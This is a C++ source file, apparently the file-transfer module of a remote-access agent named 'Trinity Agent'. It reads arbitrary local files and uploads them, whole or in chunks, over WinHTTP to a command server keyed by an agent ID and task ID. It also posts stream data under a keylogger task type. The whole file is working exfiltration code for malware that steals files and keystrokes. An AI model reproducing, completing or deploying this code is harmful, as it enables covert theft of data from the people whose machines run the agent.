#include "FileTransfer.h"

#include <algorithm>
#include <filesystem>
#include <fstream>
#include <string>
#include <vector>
#include <windows.h>
#include <winhttp.h>
#include <codecvt>
#include <Task.h>

namespace fs = std::filesystem;

namespace FileTransfer
{
    namespace
    {
        const fs::path StorageDirectory = "storage";

        std::string FileDirectory(const std::string &transferId)
        {
            return (StorageDirectory / "files" / transferId).string();
        }

        bool PostBinary(
            const std::string &url,
            const char *data,
            std::size_t size,
            const std::string &fileName = {})
        {
            std::wstring wideUrl(url.begin(), url.end());
            URL_COMPONENTS components{};
            components.dwStructSize = sizeof(components);
            wchar_t path[4096]{};
            wchar_t host[256]{};
            components.lpszHostName = host;
            components.dwHostNameLength = static_cast<DWORD>(std::size(host));
            components.lpszUrlPath = path;
            components.dwUrlPathLength = static_cast<DWORD>(std::size(path));
            if (!WinHttpCrackUrl(wideUrl.c_str(), 0, 0, &components))
                return false;

            HINTERNET session = WinHttpOpen(L"Trinity Agent File Transfer",
                                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                                             WINHTTP_NO_PROXY_NAME,
                                             WINHTTP_NO_PROXY_BYPASS, 0);
            if (!session)
                return false;
            HINTERNET connection = WinHttpConnect(session, host, components.nPort, 0);
            HINTERNET request = connection
                ? WinHttpOpenRequest(connection, L"POST", path, nullptr,
                                     WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
                                     components.nScheme == INTERNET_SCHEME_HTTPS
                                         ? WINHTTP_FLAG_SECURE : 0)
                : nullptr;
            if (!request)
            {
                if (connection) WinHttpCloseHandle(connection);
                WinHttpCloseHandle(session);
                return false;
            }

            std::wstring headers = L"Content-Type: application/octet-stream\r\n";
            if (!fileName.empty())
                headers += L"X-File-Name: " + std::wstring(fileName.begin(), fileName.end()) + L"\r\n";
            BOOL sent = WinHttpSendRequest(request, headers.c_str(), static_cast<DWORD>(-1),
                                           const_cast<char *>(data),
                                           static_cast<DWORD>(size),
                                           static_cast<DWORD>(size), 0);
            BOOL received = sent && WinHttpReceiveResponse(request, nullptr);
            DWORD status = 0;
            DWORD statusSize = sizeof(status);
            if (received)
                WinHttpQueryHeaders(request, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                                    WINHTTP_HEADER_NAME_BY_INDEX, &status, &statusSize,
                                    WINHTTP_NO_HEADER_INDEX);
            WinHttpCloseHandle(request);
            WinHttpCloseHandle(connection);
            WinHttpCloseHandle(session);
            return received && status >= 200 && status < 300;
        }
    }

    bool SendFile(
        const std::string &filePath,
        const std::string &agentKey,
        int taskId,
        const std::string &transferId,
        const std::string &apiUrl,
        std::size_t chunkSize)
    {
        if (chunkSize == 0)
            return false;

        std::ifstream file(
            filePath,
            std::ios::binary);

        if (!file)
            return false;

        file.seekg(0, std::ios::end);

        const auto fileSize = file.tellg();

        file.seekg(0, std::ios::beg);

        if (fileSize < 0)
            return false;

        const auto baseUrl =
            apiUrl + "/api/files/" + agentKey;

        const auto fileName =
            fs::path(filePath).filename().string();

        // Small files are sent in one request.
        if (fileSize < 100LL * 1024 * 1024)
        {
            std::vector<char> data(
                static_cast<std::size_t>(fileSize));

            if (!data.empty())
            {
                file.read(
                    data.data(),
                    static_cast<std::streamsize>(data.size()));

                if (!file)
                    return false;
            }

            if (!PostBinary(
                    baseUrl + "/" + transferId + "/file?fileName=" + fileName +
                        "&taskId=" + std::to_string(taskId),
                    data.empty() ? nullptr : data.data(),
                    data.size(),
                    fileName))
            {
                return false;
            }
        }
        else
        {
            // Large files are sent in chunks.
            std::vector<char> buffer(chunkSize);

            int chunkNumber = 0;

            while (
                file.read(
                    buffer.data(),
                    static_cast<std::streamsize>(buffer.size())) ||
                file.gcount() > 0)
            {
                const auto count = file.gcount();

                if (count <= 0)
                    break;

                if (!PostBinary(
                        baseUrl +
                            "/" + transferId + "/chunks/" +
                            std::to_string(chunkNumber++) + "?taskId=" +
                            std::to_string(taskId),
                        buffer.data(),
                        static_cast<std::size_t>(count)))
                {
                    return false;
                }
            }

            // Tell the server to rebuild the uploaded chunks.
            if (!PostBinary(
                    baseUrl + "/" + transferId + "/rebuild?expectedBytes=" +
                        std::to_string(fileSize) + "&taskId=" + std::to_string(taskId),
                    nullptr,
                    0))
            {
                return false;
            }
        }

        return true;
    }

    bool RebuildFile(
        const std::string &transferId,
        const std::string &outputPath)
    {
        const fs::path directory =
            FileDirectory(transferId);

        if (!fs::exists(directory))
            return false;

        std::vector<fs::path> chunks;

        for (const auto &entry :
             fs::directory_iterator(directory))
        {
            if (entry.is_regular_file())
                chunks.push_back(entry.path());
        }

        std::sort(
            chunks.begin(),
            chunks.end());

        if (chunks.empty())
            return false;

        std::ofstream output(
            outputPath,
            std::ios::binary);

        if (!output)
            return false;

        for (const auto &chunk : chunks)
        {
            std::ifstream input(
                chunk,
                std::ios::binary);

            if (!input)
                return false;

            output << input.rdbuf();

            if (!output)
                return false;
        }

        return true;
    }

    Response SendStreamData(
        const std::string &streamId,
        const std::string &data,
        const std::string &apiUrl)
    {
        if (!PostBinary(
                apiUrl + "/api/streams/" + streamId + "/data",
                data.data(),
                data.size()))
        {
            return CreateTaskResponse(
                std::stoi(streamId),
                KEYLOGGER_START,
                NO_CODE,
                TASK_ERROR,
                TaskError{
                    NO_CODE,
                    "Failed to post stream data"});
        }

        return CreateTaskResponse(
            std::stoi(streamId),
            KEYLOGGER_START,
            NO_CODE,
            SUCCESS,
            TaskSuccess{"true"});
    }
}
